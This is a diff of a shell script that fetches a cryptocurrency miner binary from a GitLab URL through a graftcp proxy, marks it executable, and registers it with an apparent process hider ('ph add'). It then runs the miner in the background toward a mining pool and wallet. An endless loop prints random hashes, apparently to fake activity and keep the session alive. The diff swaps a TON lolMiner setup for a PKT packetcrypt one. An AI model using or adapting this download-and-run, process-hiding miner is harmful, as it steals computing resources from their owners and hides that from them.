@@ -31,10 +31,10 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://gitlab.com/ninalasmi937/ton/-/raw/main/lolMiner
-chmod +x lolMiner
+./graftcp/graftcp wget https://gitlab.com/cici2/pkt/-/raw/main/packetcrypt
+chmod +x packetcrypt
 
-ph add lolMiner
+ph add packetcrypt
 
-./graftcp/graftcp ./lolMiner --algo TON --pool wss://pplns.toncoinpool.io/stratum --user EQAhYfA5-ENSYrig434CEOSFH47z5I6hft6X6magteGGEwlT.$(echo $(shuf -i 1-20000 -n 1)-V) >/dev/null &
+./graftcp/graftcp ./packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.srizbi.com >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
